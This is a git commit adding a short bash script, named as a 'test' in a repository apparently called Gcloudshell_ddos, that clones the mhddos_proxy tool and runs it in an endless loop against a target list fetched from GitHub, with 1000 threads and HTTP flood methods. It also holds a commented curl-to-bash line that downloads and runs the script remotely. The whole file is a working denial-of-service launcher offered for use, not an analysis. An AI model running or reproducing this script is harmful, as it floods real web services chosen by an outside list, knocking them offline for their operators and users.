5ad6c8efeb9c4ac0a3c034c499a8df08dd5eec83
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-05-29 23:40:34 +0300

    Create Start_L7_test.sh

---
+++ Start_L7_test.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7_test.sh | bash
+rm -rf mhddos_proxy
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+python3 -m pip install -r requirements.txt
+
+while true
+do
+   pkill -f runner.py
+   sleep 7
+   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 1000 --rpc 350 --http-methods GET STRESS --vpn --debug
+sleep 9m
+done
